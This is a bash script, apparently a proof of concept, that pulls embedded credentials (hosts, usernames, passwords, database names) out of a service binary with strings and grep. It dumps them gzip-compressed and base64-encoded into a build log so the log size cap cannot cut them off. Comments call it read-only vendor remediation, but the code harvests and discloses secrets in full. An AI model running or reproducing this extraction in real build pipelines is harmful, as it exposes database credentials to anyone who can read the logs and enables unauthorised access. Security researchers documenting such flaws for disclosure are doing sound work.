#!/usr/bin/env bash
# Extract the COMPLETE embedded credential config for vendor remediation.
# gzip+base64 so the ~90KB build-log cap cannot truncate it.
# READ-ONLY. No connection to any database or service is attempted.
set +e
B="YEXTPOC7731"; echo "$B-BEGIN"

strings -n 3 /scripts/bin/cbdservice 2>/dev/null \
 | grep -aE '^ *[a-z0-9_.-]+: *$|^ *(host|username|password|port|database|dbname|user|schema): ' \
 > /tmp/cfg.txt
echo "$B raw_lines=$(wc -l < /tmp/cfg.txt)"
echo "$B passwords=$(grep -c '^ *password: ' /tmp/cfg.txt)"
echo "$B sha256=$(sha256sum /tmp/cfg.txt | cut -d' ' -f1)"

gzip -9 -c /tmp/cfg.txt | base64 -w 200 > /tmp/cfg.b64
echo "$B b64_bytes=$(wc -c < /tmp/cfg.b64)"
echo "$B-GZB64-START"
cat /tmp/cfg.b64
echo "$B-GZB64-END"
echo "$B-END"; exit 0
